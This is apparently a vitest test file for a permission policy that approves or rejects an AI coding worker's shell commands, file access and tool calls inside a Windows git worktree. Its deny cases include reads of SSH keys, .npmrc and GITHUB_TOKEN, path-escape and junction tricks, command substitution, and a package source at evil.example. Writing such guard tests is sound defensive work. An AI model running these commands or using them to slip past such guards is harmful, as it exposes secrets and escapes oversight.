import { describe, expect, it } from "vitest";
import type { PermissionAsk } from "../src/runtime/types.ts";
import { hasEscapeHatch, scanCommand, shellArgs, WorkerPolicy } from "../src/tasks/policy.ts";

const WT = "C:\\wt\\moonrise\\fix-login";
const policy = new WorkerPolicy({ worktree: WT, readTools: new Set(["github-get_issue"]) });

const shell = (command: string, extra: Partial<Extract<PermissionAsk, { kind: "shell" }>> = {}): PermissionAsk => ({
  kind: "shell",
  command,
  // The runtime splits a command line into segments at pipes and separators; tests do the same, roughly.
  segments: command.split(/\s*(?:\||;|&&)\s*/).filter(Boolean),
  cwd: WT,
  possiblePaths: [],
  possibleUrls: [],
  ...extra,
});

describe("WorkerPolicy", () => {
  it.each([
    // files: inside the worktree only, and never its .git link
    [{ kind: "read", path: `${WT}\\src\\a.ts` }, true],
    [{ kind: "read", path: "C:\\Users\\me\\.npmrc" }, false],
    [{ kind: "write", path: `${WT}\\src\\a.ts` }, true],
    [{ kind: "write", path: `${WT}\\..\\other\\a.ts` }, false],
    [{ kind: "write", path: `${WT}\\.git` }, false],
    [{ kind: "write", path: `${WT}\\.GIT\\config` }, false],
    [{ kind: "write", path: `${WT}\\.git.` }, false],
    [{ kind: "write", path: `${WT}\\.git ` }, false],
    [{ kind: "write", path: `${WT}\\GIT~1` }, false],
    [{ kind: "write", path: `${WT}\\docs\\.gitignore` }, true],
    // tools
    [{ kind: "mcp", server: "github", tool: "github-get_issue", args: {} }, true],
    [{ kind: "mcp", server: "Acme", tool: "Acme-list_my_issues", args: {} }, false],
    [{ kind: "url", url: "https://example.com" }, false],
    [{ kind: "custom-tool", tool: "anything" }, true],
    [{ kind: "other", detail: "memory" }, false],
  ] as const)("%j → %s", (ask, approve) => {
    expect(policy.decide(ask).approve).toBe(approve);
  });

  it.each([
    // allowed: git basics, tests, builds, lockfile installs (D18), read-only PowerShell
    ["git status --short", true],
    ["git add -A", true],
    ["git commit -m 'Add login fix'", true],
    ["git diff --stat", true],
    ["git branch", true],
    ["git log --oneline -5 | Select-String fix", true],
    ["npm test", true],
    ["npm test 2>&1", true],
    ["npm run build", true],
    ["npm ci", true],
    ["npm install", true],
    ["npm install --no-audit --no-fund", true],
    ["pnpm install --frozen-lockfile", true],
    ["yarn install --frozen-lockfile", true],
    ["dotnet restore", true],
    ["dotnet test", true],
    ["cargo build", true],
    ["python -m pytest -q", true],
    ["Get-Content src\\app.ts", true],
    [`Get-Content ${WT}\\src\\app.ts`, true],
    ["Get-ChildItem -Recurse -Filter *.ts", true],
    // not without asking (which arrives in Phase 3)
    ["git push", false],
    ["git push origin aria/fix-login", false],
    ["git checkout main", false],
    ["git reset --hard HEAD~1", false],
    ["git branch -D main", false],
    ["git config user.email x@y.z", false],
    ["git -C C:\\Users\\me\\Documents\\GitHub\\Other status", false],
    ["git -c core.hooksPath=x commit -m 'x'", false],
    ["npm install lodash", false],
    ["npm i left-pad --save", false],
    ["npm install --prefix C:\\elsewhere", false],
    ["yarn install", false],
    ["yarn add react", false],
    ["npx tsc", false],
    ["node scripts/build.js", false],
    ["Remove-Item -Recurse -Force src", false],
    ["Set-Location ..", false],
    ["Get-Content ..\\other\\secret.txt", false],
    ["Get-Content C:\\Users\\me\\.ssh\\id_rsa", false],
    ["Get-Content $env:USERPROFILE\\.npmrc", false],
    ['git commit -m "Fix $(whoami)"', false],
    ["Get-ChildItem | ForEach-Object { $_.Name }", false],
    ["git status > status.txt", false],
    ["Invoke-WebRequest https://example.com", false],
    ["curl https://example.com", false],
  ])("`%s` → %s", (command, approve) => {
    expect(policy.decide(shell(command)).approve).toBe(approve);
  });

  it("rejects commands that run outside the worktree, mention outside paths or contact a URL", () => {
    expect(policy.decide(shell("git status", { cwd: "C:\\Users\\me" })).approve).toBe(false);
    expect(policy.decide(shell("git status", { cwd: `${WT}\\.git` })).approve).toBe(false);
    expect(policy.decide(shell("Get-Content a.txt", { possiblePaths: ["C:\\Windows\\win.ini"] })).approve).toBe(false);
    expect(policy.decide(shell("npm test", { possibleUrls: ["https://evil.example"] })).approve).toBe(false);
    expect(policy.decide(shell("git status", { segments: [] })).approve).toBe(false);
  });

  it("explains a refusal so the worker can carry on", () => {
    const verdict = policy.decide(shell("git push"));
    expect(verdict).toMatchObject({ approve: false });
    expect(!verdict.approve && verdict.reason).toMatch(/isn't allowed here.*approval/);
    // A path in a short-option cluster can't be told from the option letters: the worker is told how to write it.
    const clustered = policy.decide(shell("git grep -fconfig/patterns.txt"));
    expect(!clustered.approve && clustered.reason).toMatch(/write it apart, as in `-f file`/);
  });

  it.each([
    // quotes don't hide an option or a path from the check: PowerShell removes them before the program sees them
    ["git log '--output=../outside.txt'", false],
    ['git log "--output=notes.txt"', false],
    ["git log '--outp=notes.txt'", false],
    ["git log \u2018--output=../x\u2019", false],
    ["npm run build '--prefix=..'", false],
    ["npm run build -- --outDir=../dist", false],
    ["npm ci --userconfig .npmrc", false],
    ["dotnet restore --source https://evil.example/nuget", false],
    ["git log --% --output=x", false],
    // the .git link, links that point anywhere, and things that aren't files in the worktree
    ["New-Item -ItemType File -Path .git -Force", false],
    ["New-Item -Path .GIT\\config -Force", false],
    ["git log -- .git", false],
    ["New-Item -ItemType Junction -Path link -Target src", false],
    ["New-Item -it j -Path link -Value src", false],
    ["New-Item -Ty:SymbolicLink -Path link -Value src", false],
    ["New-Item -Path link -ItemType 'Junction' -Target:..\\..", false],
    ["Get-Content env:GITHUB_TOKEN", false],
    ["Get-ChildItem env:", false],
    ["Get-Content ~\\.npmrc", false],
    ["Get-Content Microsoft.PowerShell.Core\\FileSystem::C:\\Users\\me\\.npmrc", false],
    ["Get-Content a.txt,..\\b.txt", false],
    ["Get-Content -Path:D:\\secrets.txt", false],
    // round 2: typographic dashes, ~ for programs too, attached short-option values, Windows names for .git
    ["Get-ChildItem \u2013Path:..", false],
    ["New-Item \u2013it:j \u2013Path:link \u2013Value:..", false],
    ["git commit -F ~/.npmrc", false],
    ["git commit -F../PLAN.md", false],
    ["git diff -O../PLAN.md --stat", false],
    ["dotnet build -oC:\\out", false],
    ["New-Item -ItemType File -Path .git. -Force", false],
    ["New-Item -Path '.git ' -Force", false],
    ["Get-Content GIT~1", false],
    ["Get-Content GI4F2A~1", false],
    ["Get-Content .git:stream", false],
    // round 3: clustered short options, MSBuild properties
    ["git grep -nf../PLAN.md", false],
    ["git commit -aF../PLAN.md", false],
    ["dotnet build -p:OutputPath=../out", false],
    ["dotnet build --property:OutputPath=../out", false],
    ["dotnet build -p:BaseIntermediateOutputPath=../obj", false],
    ["dotnet build /p:OutputPath=../out", false],
    ["dotnet build -p:OutputPath=C:\\elsewhere", false],
    ["git grep -fconfig/../../PLAN.md", false],
    ["git log -nO/Users/me/order.txt", false],
    // still fine
    ["New-Item -ItemType File -Path notes.txt", true],
    ["New-Item -ItemType:d -Path src\\new", true],
    ["mkdir src\\new", true],
    ["git show HEAD:src/app.ts", true],
    ["git log --format=%h:%s -5", true],
    ["git diff --cached", true],
    ["git commit -m 'Explain why: see docs, then ship'", true],
    ["Select-String -Pattern 'std::string' -Path src\\a.cpp", true],
    [`Get-Content -Path:${WT}\\src\\a.ts`, true],
    ["dotnet build -c Release", true],
    ["git log -C --stat", true],
    ["git log -n5 --oneline", true],
    ["git show HEAD~1", true],
    ["git commit -m 'Fix the bug.'", true],
    ["Get-Content .gitignore", true],
    ["git commit -am 'Fix it'", true],
    ["dotnet build -p:Configuration=Release", true],
    ["go test ./...", true],
    ["go vet ./...", true],
    ["git commit -m 'Docs: see https://example.com'", true],
    ["git grep -f config/patterns.txt", true],
    ["dotnet test -p:CoverletOutput=./coverage/", true],
    ["dotnet build /p:Configuration=Release /nologo", true],
    ["go test -run=TestFoo/Bar ./...", true],
  ])("argument check: `%s` → %s", (command, approve) => {
    expect(policy.decide(shell(command)).approve).toBe(approve);
  });
});

describe("shellArgs", () => {
  it.each([
    ["git commit -m 'Fix it'", ["git", "commit", "-m", "Fix it"]],
    ['git log "--output=x" a', ["git", "log", "--output=x", "a"]],
    ["git log --output='../x'", ["git", "log", "--output=../x"]],
    ["echo 'it''s'", ["echo", "it's"]],
    // PowerShell 5.1 leaves an empty argument out, and a word that starts with a quote ends with it.
    ["echo '' a", ["echo", "a"]],
    ["echo 'a'b x'y'z", ["echo", "a", "b", "xyz"]],
    ["echo \u201chi there\u201d", ["echo", "hi there"]],
    ["Get-Item \u2013Path:x '\u2013kept'", ["Get-Item", "-Path:x", "\u2013kept"]],
    // Comments, redirections and other commands aren't arguments.
    ["git push origin #aria/x", ["git", "push", "origin"]],
    ["git push origin 'a'#b", ["git", "push", "origin", "a"]],
    ["git push origin <#x#>y a#b", ["git", "push", "origin", "y", "a#b"]],
    ["git push origin 2>&1 >$null 2> err.txt a>b", ["git", "push", "origin", "a>b"]],
    ["git log | git push origin x", ["git", "log", "git", "push", "origin", "x"]],
  ])("`%s`", (segment, args) => {
    expect(shellArgs(segment)).toEqual(args);
  });
});

describe("scanCommand", () => {
  it("splits a line into its commands where PowerShell does", () => {
    const texts = (line: string) => scanCommand(line).map((s) => s.text);
    expect(texts("git status; git push origin x")).toEqual(["git status", "git push origin x"]);
    expect(texts("git log | Select-Object -First 5")).toEqual(["git log", "Select-Object -First 5"]);
    expect(texts("git status\ngit push origin x")).toEqual(["git status", "git push origin x"]);
    expect(texts("git status && git push || echo no")).toEqual(["git status", "git push", "echo no"]);
    // A script block's braces end commands: the ones inside run too.
    expect(texts("node test.js; if ($?) { git add a.js; git status --short }")).toEqual(["node test.js", "if ($?)", "git add a.js", "git status --short"]);
    expect(texts("if ($?) {git add a.js} else {exit 1}")).toEqual(["if ($?)", "git add a.js", "else", "exit 1"]);
    expect(texts("Invoke-Command { git push origin HEAD:main }")).toEqual(["Invoke-Command", "git push origin HEAD:main"]);
    // Not inside quotes or comments, and not where a backtick continues the line.
    expect(texts("echo 'a; b' \"c | d\"")).toEqual(["echo 'a; b' \"c | d\""]);
    expect(texts("git push `\n  origin x")).toEqual(["git push `\n  origin x"]);
    expect(scanCommand("git push `\n  origin x")[0]!.args).toEqual(["git", "push", "origin", "x"]);
    expect(texts("git status # a; comment\ngit push")).toEqual(["git status # a; comment", "git push"]);
    // A here-string is one argument, whatever it holds.
    expect(scanCommand("git commit -m @'\nFix; it | now\n'@ ; git log")).toEqual([
      { text: "git commit -m @'\nFix; it | now\n'@", args: ["git", "commit", "-m", "Fix; it | now"] },
      { text: "git log", args: ["git", "log"] },
    ]);
  });

  it.each([
    ["git push origin $b", "$"],
    ['git push origin "HEAD:$b"', "$"],
    ["git push origin HEAD:ma$b", "$"],
    ["git push origin foo(echo bar)", "(…)"],
    ["git push origin (echo main)", "(…)"],
    ["git push origin ${branch}", "$"],
    ["git @x", "@…"],
    ["git push origin @(1)", "@…"],
    ["git push origin HEAD:main, HEAD:x", "list"],
    ["git push origin a , b", "list"],
    ["git push --% origin %BRANCH%", "--%"],
    ["git push origin 'HEAD:main", "quote"],
    ['git commit -m @"\n$x\n"@', "$"],
    ["git push origin a&b", "&"],
    ["git push > $(git push origin HEAD:main)", "$"],
  ])("`%s` can't be read from its text (%s)", (line, reason) => {
    expect(scanCommand(line)[0]!.unreadable).toContain(reason === "list" ? "list" : reason === "quote" ? "quote" : reason);
  });

  it.each([
    "git push origin 'HEAD:$b'",
    "git push origin a$ b$",
    "git log --format='%h (%s)' \"x(y)\"",
    "git commit -m \"Fix (closes #12)\"",
    "git push origin HEAD:x 2>$null",
    "git push origin git@github.com:o/r.git",
    "gh pr list --json number,title",
  ])("`%s` is read from its text", (line) => {
    expect(scanCommand(line)[0]!.unreadable).toBeUndefined();
  });
});

describe("hasEscapeHatch", () => {
  it.each([
    ["git commit -m 'Cost: $5'", false],
    ['git commit -m "Cost: $5"', true],
    ["npm test 2>&1 | Select-String fail", false],
    ["npm test *> log.txt", true],
    ["git --git-dir=C:\\other\\.git log", true],
    ["Get-Item `$x", true],
  ])("`%s` → %s", (command, expected) => {
    expect(hasEscapeHatch(command)).toBe(expected);
  });
});
